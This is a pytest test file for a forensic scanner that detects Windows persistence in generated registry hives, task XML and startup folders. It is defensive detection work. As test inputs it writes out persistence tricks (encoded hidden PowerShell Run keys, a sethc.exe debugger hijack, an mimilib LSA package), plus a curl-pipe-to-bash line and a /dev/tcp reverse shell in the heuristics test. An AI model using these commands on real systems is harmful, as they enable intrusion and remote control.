"""Windows persistence checks against generated hives, task XML and folders (no real Windows data)."""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from offscan import sandbox
from offscan.persistence import heuristics, windows
from offscan.safefs import RootFS
from support.regwriter import REG_EXPAND_SZ, Key, write_hive

pytest.importorskip("regipy")

CV = "Microsoft\\Windows\\CurrentVersion"
NT = "Microsoft\\Windows NT\\CurrentVersion"

TASK_TEMPLATE = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Principals><Principal id="Author"><UserId>S-1-5-18</UserId></Principal></Principals>
  <Settings><Hidden>{hidden}</Hidden></Settings>
  <Actions Context="Author"><Exec><Command>{command}</Command><Arguments>{args}</Arguments></Exec></Actions>
</Task>
"""


def _software() -> Key:
    root = Key("ROOT")
    run = root.key(f"{CV}\\Run")
    run.set("Updater", "C:\\Users\\Public\\evil.exe -silent")
    run.set("SecurityHealth", "%windir%\\system32\\SecurityHealthSystray.exe", REG_EXPAND_SZ)
    ifeo = root.key(f"{NT}\\Image File Execution Options")
    ifeo.key("sethc.exe").set("Debugger", "C:\\Windows\\System32\\cmd.exe")
    root.key(f"{NT}\\Image File Execution Options\\notepad.exe").set("UseFilter", 0)
    winlogon = root.key(f"{NT}\\Winlogon")
    winlogon.set("Shell", "explorer.exe")
    winlogon.set("Userinit", "C:\\Windows\\system32\\userinit.exe,C:\\ProgramData\\x.exe")
    root.key(f"{NT}\\Schedule\\TaskCache\\Tree\\Microsoft\\Defrag").set("Id", "{1}").set("SD", b"\x01\x00")
    root.key(f"{NT}\\Schedule\\TaskCache\\Tree\\EvilTask").set("Id", "{2}")
    root.key(NT).set("ProductName", "Windows 10 Pro").set("CurrentBuild", "22631")
    return root


def _system() -> Key:
    root = Key("ROOT")
    root.key("Select").set("Current", 1)
    ccs = "ControlSet001"
    evil = root.key(f"{ccs}\\Services\\EvilSvc")
    evil.set("ImagePath", "C:\\Users\\bob\\AppData\\Roaming\\svc.exe").set("Start", 2).set("Type", 16)
    good = root.key(f"{ccs}\\Services\\GoodSvc")
    good.set("ImagePath", "%SystemRoot%\\System32\\svchost.exe -k netsvcs", REG_EXPAND_SZ)
    good.set("Start", 2).set("Type", 32)
    good.key("Parameters").set("ServiceDll", "%SystemRoot%\\System32\\good.dll", REG_EXPAND_SZ)
    root.key(f"{ccs}\\Services\\fltdrv").set("ImagePath", "\\SystemRoot\\System32\\drivers\\flt.sys") \
        .set("Start", 0).set("Type", 1)
    root.key(f"{ccs}\\Control\\Session Manager").set("BootExecute", ["autocheck autochk *"])
    root.key(f"{ccs}\\Control\\Lsa").set("Security Packages", ["kerberos", "msv1_0", "mimilib"])
    root.key(f"{ccs}\\Control\\Session Manager\\Power").set("HiberbootEnabled", 1)
    return root


def _ntuser() -> Key:
    root = Key("ROOT")
    run = root.key(f"Software\\{CV}\\Run")
    run.set("OneDrive", "C:\\Users\\bob\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe /background")
    run.set("Evil", "powershell.exe -nop -w hidden -enc SQBFAFgA")
    root.key("Environment").set("UserInitMprLogonScript", "%APPDATA%\\logon.bat", REG_EXPAND_SZ)
    root.key(f"Software\\{CV}\\Explorer\\User Shell Folders").set(
        "Startup", "%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        REG_EXPAND_SZ)
    return root


def _task(path: Path, command: str, args: str = "", hidden: bool = False) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    xml = TASK_TEMPLATE.format(hidden=str(hidden).lower(), command=command, args=args)
    path.write_bytes(b"\xff\xfe" + xml.encode("utf-16-le"))


@pytest.fixture
def win_root(tmp_path: Path) -> Path:
    root = tmp_path / "C"
    config = root / "Windows/System32/config"
    config.mkdir(parents=True)
    write_hive(_software(), config / "SOFTWARE", "SOFTWARE")
    write_hive(_system(), config / "SYSTEM", "SYSTEM")
    bob = root / "Users/bob"
    (bob / "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup").mkdir(parents=True)
    write_hive(_ntuser(), bob / "NTUSER.DAT", "NTUSER.DAT")
    startup = bob / "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
    (startup / "evil.vbs").write_text("WScript.Echo 1")
    (startup / "desktop.ini").write_text("[.ShellClassInfo]")
    (root / "Users/Public").mkdir()
    tasks = root / "Windows/System32/Tasks"
    _task(tasks / "Microsoft/Windows/Defrag/ScheduledDefrag", "%windir%\\system32\\defrag.exe", "-c -h")
    _task(tasks / "Updater", "wscript.exe", "C:\\Users\\Public\\upd.vbs", hidden=True)
    (tasks / "Billion").write_text('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "aaaa">]><x>&a;</x>')
    wbem = root / "Windows/System32/wbem/Repository"
    wbem.mkdir(parents=True)
    (wbem / "OBJECTS.DATA").write_bytes(
        b"\0" * 100 + b"CommandLineEventConsumer\0\0EvilConsumerName\0"
        + b"powershell.exe -enc AAAAAAAA\0" + b"\0" * 100)
    for path in (config / "SOFTWARE", config / "SYSTEM", bob / "NTUSER.DAT"):
        path.chmod(0o600)           # the sandbox must not need to re-open these by path
    return root


def _run(win_root: Path, in_sandbox: bool) -> dict:
    with RootFS(win_root) as root:
        args, fds = windows.collect(root)
    try:
        if in_sandbox:
            return sandbox.run("windows.persistence", args, fds, timeout=120)
        return windows.task_persistence(args, fds)
    finally:
        for fd in fds:
            os.close(fd)


def _by_check(result: dict) -> dict[str, list[dict]]:
    out: dict[str, list[dict]] = {}
    for finding in result["findings"]:
        out.setdefault(finding["check"], []).append(finding)
    return out


def test_windows_findings(win_root: Path) -> None:
    result = _run(win_root, in_sandbox=False)
    checks = _by_check(result)
    runs = {f["title"]: f for f in checks["windows.run_key"]}
    assert runs['Autostart entry "Updater"']["severity"] == "high"
    assert runs['Autostart entry "Updater"']["target"] == "/Users/Public/evil.exe"
    assert runs['Autostart entry "SecurityHealth"']["severity"] == "info"
    assert runs['Autostart entry "SecurityHealth"']["target"] == "/Windows/system32/SecurityHealthSystray.exe"
    assert runs['Autostart entry "Evil" (bob)']["severity"] == "high"
    assert runs['Autostart entry "OneDrive" (bob)']["severity"] == "info"
    assert runs['Autostart entry "OneDrive" (bob)']["user"] == "bob"

    ifeo = checks["windows.ifeo"]
    assert [f["mitre"] for f in ifeo] == ["T1546.008"] and ifeo[0]["severity"] == "high"
    assert [f["title"] for f in checks["windows.winlogon"]] == ["Winlogon Userinit modified"]
    assert checks["windows.task_hidden"][0]["location"].endswith("\\EvilTask")
    assert len(checks["windows.task_hidden"]) == 1

    services = {f["title"]: f for f in checks["windows.service"]}
    assert services["Auto-start service EvilSvc"]["severity"] == "medium"
    assert "Auto-start service GoodSvc" not in services            # info entries are not reported
    assert "/Users/bob/AppData/Roaming/svc.exe" in result["targets"]
    assert "/Windows/System32/drivers/flt.sys" in result["targets"]
    assert "/Windows/System32/svchost.exe" in result["targets"]
    assert checks["windows.lsa"][0]["value"] == "mimilib"
    assert "windows.boot_execute" not in checks
    assert result["info"]["fast_startup"] is True
    assert checks["windows.logon_script"][0]["severity"] == "medium"
    assert "windows.startup_redirect" not in checks

    tasks = {f["title"]: f for f in checks["windows.scheduled_task"]}
    assert tasks["Scheduled task /Microsoft/Windows/Defrag/ScheduledDefrag"]["severity"] == "info"
    hidden = tasks["Scheduled task /Updater"]
    assert hidden["severity"] == "high" and "the task is marked hidden" in hidden["reasons"]
    assert hidden["target"] == "/Users/Public/upd.vbs"
    assert any("refusing XML with a DTD" in e for e in result["errors"])

    startup = checks["windows.startup_folder"]
    assert [f["title"] for f in startup] == ["Startup folder item evil.vbs"]
    assert startup[0]["severity"] == "medium"
    assert checks["windows.wmi"][0]["severity"] == "high"


def test_windows_persistence_in_sandbox(win_root: Path) -> None:
    """Same data through the real sandbox (unprivileged child, hives mode 0600)."""
    direct = _run(win_root, in_sandbox=False)
    boxed = _run(win_root, in_sandbox=True)
    assert boxed["findings"] == direct["findings"]
    assert boxed["targets"] == direct["targets"]


def test_command_targets() -> None:
    t = heuristics.command_target
    assert t('"C:\\Program Files\\App\\app.exe" --minimized') == "/Program Files/App/app.exe"
    assert t("C:\\Program Files\\App\\app.exe --x") == "/Program Files/App/app.exe"
    assert t("%SystemRoot%\\system32\\svchost.exe -k netsvcs") == "/Windows/system32/svchost.exe"
    assert t("rundll32.exe C:\\Users\\Public\\x.dll,Start") == "/Users/Public/x.dll"
    assert t("wscript.exe //B C:\\temp\\a.vbs") == "/temp/a.vbs"
    assert t('cmd.exe /c "C:\\x y\\a.bat" arg') == "/x y/a.bat"
    assert t("powershell.exe -ExecutionPolicy Bypass -File C:\\s\\run.ps1") == "/s/run.ps1"
    assert t("cmd.exe /c echo hi") == "/Windows/System32/cmd.exe"
    assert t("D:\\tools\\x.exe") is None
    assert t("%APPDATA%\\evil.exe", "/Users/bob") == "/Users/bob/AppData/Roaming/evil.exe"
    assert t("\\??\\C:\\Windows\\x.sys") == "/Windows/x.sys"
    assert t("notepad.exe") == "/Windows/System32/notepad.exe"


def test_heuristics() -> None:
    sev, reasons = heuristics.assess_windows("powershell -nop -w hidden -enc AAAA")
    assert sev == "high" and reasons
    assert heuristics.assess_windows("C:\\Program Files\\Vendor\\tool.exe")[0] == "info"
    assert heuristics.assess_linux("curl -fsSL http://x.example/a.sh | bash")[0] == "high"
    assert heuristics.assess_linux("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")[0] == "high"
    assert heuristics.assess_linux("/usr/bin/apt-get update")[0] == "info"
    assert heuristics.higher("low", "high") == "high" and heuristics.higher("high", "info") == "high"
